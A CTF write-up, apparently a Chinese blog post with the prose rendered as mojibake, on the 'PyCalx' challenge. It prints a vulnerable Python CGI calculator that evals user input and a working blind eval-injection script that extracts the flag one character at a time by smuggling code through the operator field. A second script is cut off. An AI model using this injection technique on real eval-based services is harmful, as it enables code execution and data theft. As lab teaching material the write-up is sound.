&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cgi&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">html&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">escape&lt;/span>
&lt;span style="color:#111">FLAG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/var/www/flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">OK_200&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Content-type: text/html
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;center&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;title&amp;gt;PyCalx&amp;lt;/title&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;h1&amp;gt;PyCalx&amp;lt;/h1&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;form&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;input class=&amp;#34;form-control col-md-4&amp;#34; type=text name=value1 placeholder=&amp;#39;Value 1 (Example: 1 abc)&amp;#39; autofocus/&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;input class=&amp;#34;form-control col-md-4&amp;#34; type=text name=op placeholder=&amp;#39;Operator (Example: + - * ** / // == != )&amp;#39; /&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;input class=&amp;#34;form-control col-md-4&amp;#34; type=text name=value2 placeholder=&amp;#39;Value 2 (Example: 1 abc)&amp;#39; /&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;input class=&amp;#34;form-control col-md-4 btn btn-success&amp;#34; type=submit value=EVAL /&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;/form&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;a href=&amp;#39;?source=1&amp;#39;&amp;gt;Source&amp;lt;/a&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;lt;/center&amp;gt;
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">OK_200&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">arguments&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cgi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FieldStorage&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">value&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;value1&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">arguments&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#39;value2&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">arguments&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#39;op&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_value&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#ae81ff">64&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">isdigit&lt;/span>&lt;span style="color:#111">():&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">blacklist&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;(&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;[&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># I don&amp;#39;t like tuple, list and dict.&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">blacklist&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#111">[]:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">val&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_op&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">list_ops&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;+&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;-&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;*&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;=&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;!&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">list_ops&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">val&lt;/span>
&lt;span style="color:#111">op&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">get_op&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;op&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">get_value&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value1&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">get_value&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">arguments&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value2&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">isdigit&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">^&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">isdigit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;center&amp;gt;Types of the values don&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t match&amp;lt;/center&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">calc_eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">calc_eval&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">calc_eval&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">isdigit&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;True&amp;#39;&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;False&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># Sorry we don&amp;#39;t support output as a string due to security issue.&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¯å®žçŽ°äº†ä¸€ä¸ªè®¡ç®—å™¨ï¼ˆé™¤äº†æ•°å­—è¿˜å¯ä»¥è¿ç®—å­—ç¬¦ä¸²ï¼‰ï¼Œä½†æ˜¯å¯¹å‚æ•°çš„è¿‡æ»¤ä¸Šå¹¶ä¸ä¸¥è°¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211173753491.png" alt="image-20211211173753491">&lt;/p>
&lt;p>å¿˜äº†ä½¿ç”¨&lt;code>get_value&lt;/code>å‡½æ•°äº†ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ç”¨é»‘åå•é‡Œé¢çš„è¿ç®—ç¬¦çš„ï¼Œç”¨ç±»ä¼¼char-by-char-sqliçš„æ–¹å¼ç›²æ³¨å‡ºflagï¼ˆå› ä¸ºæ²¡æœ‰å›žæ˜¾ï¼‰ï¼Œæˆ‘ä»¬å¯æŽ§çš„å˜é‡æ˜¯sourceï¼ˆä½œç”¨åŸŸæ˜¯å…¨å±€ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://eabb9a29-a56e-461e-a0a8-7953b6c243c5.node4.buuoj.cn:81/cgi-bin/pycalx.py?source=&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value1=&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;amp;op=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value2=&lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WQERGFD&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; and FLAG&amp;gt;source#&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printable&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#75715e">#print(result)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;False&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;security&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹ç€è·Ÿsqliå¾ˆåƒï¼Œæ˜¯å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œpythoné»˜è®¤æ¯”å®Œç¬¬ä¸€ä½æ¯”ç¬¬äºŒä½ï¼Œæ‰€ä»¥ä¸éœ€è¦sqlié‚£æ ·æŒ‡åç¬¬å‡ ä½é‚£æ ·ï¼Œæ³¨å…¥å¯ä»¥æ™®é€šfor&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.api&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">get&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://eabb9a29-a56e-461e-a0a8-7953b6c243c5.node4.buuoj.cn:81/cgi-bin/pycalx.py?source=&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value1=&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;amp;op=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value2=&lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">value1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;WQERGFD&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
